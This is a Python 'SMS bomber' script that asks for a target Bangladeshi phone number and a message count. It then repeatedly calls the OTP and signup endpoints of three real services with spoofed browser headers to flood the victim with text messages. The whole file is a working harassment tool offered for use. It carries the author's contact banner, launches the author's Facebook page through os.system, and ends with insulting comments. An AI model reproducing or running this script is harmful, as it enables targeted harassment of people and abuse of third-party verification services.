import os,requests,time
time.sleep(1)
os.system("clear")
os.system("xdg-open https://www.facebook.com/zibon.roy.37")

logo3 = ("""
\033[32;1m╔═════════════════════════════════════════════╗
\033[32;1m║
\033[32;1m║\033[32;1m    _______     ____  __
\033[32;1m║\033[32;1m   / __/ _ |__ / / / / /
\033[32;1m║\033[32;1m  _\ \/ __ / // / /_/ / 
\033[32;1m║\033[32;1m /___/_/ |_\___/\____/                    
\033[32;1m╚═════════════════════════════════════════════╝
\x1b[38;5;196m╔═════════════╗  ࿇⃝🌹S🌹⃝࿇  \033[38;5;46m╔══════════════════╗
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m║\033[38;5;46mSAJU AHMED           ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢J🌹⃝࿇  \033[38;5;46m║\033[38;5;46mSAJU AHMED     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢U🌹⃝࿇  \033[38;5;46m║\033[38;5;46m+8801905067662     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46mSAJU-CYBER-999║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢𝐊⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m+8801905067662     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢𝐈⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m  ║+8801905067662
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢𝐆⃢🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")
print(logo3)
num=input("""  \033[1;31mTARGET NUMBER : +880""")
amount=int(input("\n  \033[1;31mSMS AMOUNT : "))
headers1={
			  "authority":"www.bioscopelive.com",
			  "method":"GET",
			  "scheme":"https",
			  "accept":"*/*",
			  "accept-encoding":"gzip, deflate, br",
			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
			  "save-data":"on",
			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
			  "sec-ch-ua-mobile":"?1",
			  "sec-ch-ua-platform":'Android',
			  "sec-fetch-dest":"empty",
			  "sec-fetch-mode":"cors",
			  "sec-fetch-site":"same-origin",
			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
			  "x-requested-with":"XMLHttpRequest"
}
url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
headers2={
         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
data={
  "name": num,
  "phoneNumber": num,
  "service": "redx"
}
headers3={
  "referer":"https://redx.com.bd/",
  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
}
ses=0
while amount>ses:
  sent1=requests.get(url1,headers=headers1)
  if sent1.status_code==200:
    ses+=1
    print(f"\n{ses} \033[1;32mSMS WAS SENT🐍")
  else:
    pass
  
  sent2=requests.get(url2,headers=headers2)
  if sent2.status_code==200:
    ses+=1
    print(f"\n{ses} \033[1;32mSMS WAS SENT🐍")
  else:
    pass
  
  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
  if send3.status_code==200:
    ses+=1
    print(f"\n{ses} \033[1;32mSMS WAS SENT🐍")
    
  else:
    pass
os.system("clear")
print(""" \033[1;32m
      ____  ____  _  ________
     / __ \/ __ \/ | / / ____/
    / / / / / / /  |/ / __/   
   / /_/ / /_/ / /|  / /___   
  /_____/\____/_/ |_/_____/   
                            
 TNQ FOR USING OUR TOOLS 🖤
""")
#madarcod ase geli script curi korte 🙂
#bancod tk khoroc kore nijeo to sikhte paros